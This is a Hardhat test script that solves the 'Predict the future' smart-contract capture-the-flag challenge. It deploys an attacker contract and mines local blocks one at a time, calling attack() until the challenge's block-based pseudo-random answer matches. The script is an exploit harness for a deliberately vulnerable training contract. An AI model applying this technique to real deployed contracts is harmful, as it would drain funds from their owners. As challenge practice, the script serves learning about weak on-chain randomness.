const { expect } = require('chai');
const { ethers } = require('hardhat');

describe('Predict the future', function () {
    let deployer, attacker;

    before(async function () {
        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
        [deployer, attacker] = await ethers.getSigners();

        const Factory = await ethers.getContractFactory('PredictTheFutureChallenge', deployer);
        this.predictTheFuture = await Factory.deploy({value: ethers.utils.parseUnits("1")});
    });
    //I set the number to 0 and as it could go from 0-9 I check for every block if I would get the answer
    it('Exploit', async function () {
        const Factory = await ethers.getContractFactory('PredictTheFutureChallengeAttacker', attacker);
        const attackerContract = await Factory.deploy(this.predictTheFuture.address, {value: ethers.utils.parseUnits("1")});
        let balance = await ethers.provider.getBalance(attackerContract.address);
        while(balance == 0) {
            await ethers.provider.send("hardhat_mine", ["0x1"]);
            await attackerContract.attack();
            const balance = await ethers.provider.getBalance(attackerContract.address);
            if(balance > 0) {
                break;
            }
        }
    });

    after(async function () {
        /** SUCCESS CONDITIONS */
        expect(
            await this.predictTheFuture.isComplete()
        ).to.be.eq(true);
    });
});